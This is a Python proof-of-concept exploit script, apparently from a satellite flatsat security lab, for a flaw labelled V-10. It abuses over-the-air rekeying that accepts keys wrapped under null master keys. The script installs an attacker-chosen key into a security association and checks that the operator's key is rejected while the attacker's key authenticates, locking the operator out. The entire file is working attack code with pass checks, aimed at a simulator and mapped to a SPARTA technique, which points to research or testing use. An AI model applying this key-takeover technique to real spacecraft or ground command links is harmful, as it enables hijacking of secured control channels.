#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-10  OTAR validates the master-key index only (m < 128) and all 128
# master keys are NULL -> anyone can wrap a new SA key under key #0 and
# expropriate the operator's secure channel.
# SPARTA: AC-0002.01 (credential install by unauthenticated delivery)
def sec(spi, arc, key):
    body = fs.aes_ecb_encrypt_wrap(fs.LINK_KEY, b"")
    s = struct.pack(">HI", spi, arc)
    data = s + b"\x00" * 16 + body
    hdr = fs.spp_pack(0x0C, data, 1, sechdr=1)[:6]
    mac = fs.cmac(key, hdr + body)
    return fs.spp_pack(0x0C, s + mac + body, 1, sechdr=1)

def main(dev, ev):
    dev.tc(0x15, bytes([1, 16, 5]), via="usb")
    attacker_key = bytes.fromhex("C0FFE00DC0FFEED1C0FFEED1BADC0FFE")
    ct = fs.aes_ecb_encrypt(bytes(16), attacker_key)   # wrapped under NULL key
    body = fs.aes_ecb_encrypt_wrap(fs.LINK_KEY, bytes([0, 0, 5]) + ct)   # OTAR SA5, master 0
    r = dev._decode_all(dev._xfer(fs.spp_pack(0x16, body, 2), "radio", want=0x16))
    ota = dev.find(r, 0x16)[0]
    ev.log(f"OTAR ack: ok={ota.u8(2)} master={ota.u8(3)} sa={ota.u8(4)}")
    check(ota.u8(2) == 1, "null master key accepted the install")
    # operator's old key now FAILS the MAC, attacker's key passes:
    op = dev._decode_all(dev._xfer(sec(5, 1, fs.LINK_KEY), "radio",
                                   want=(0x09, 0x0C)))
    check(dev.err_text(op) == "SDLS MAC FAIL", "operator key no longer works")
    at = dev._decode_all(dev._xfer(sec(5, 1, attacker_key), "radio",
                                   want=(0x0C, 0x09)))
    check(dev.find(at, 0x0C), "attacker-installed key authenticates")
    ev.log("=> SA5 now trusts the attacker: operator locked out of his own "
           "secured APID, attacker writes with full authority")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-10 OTAR null master key takeover", main))
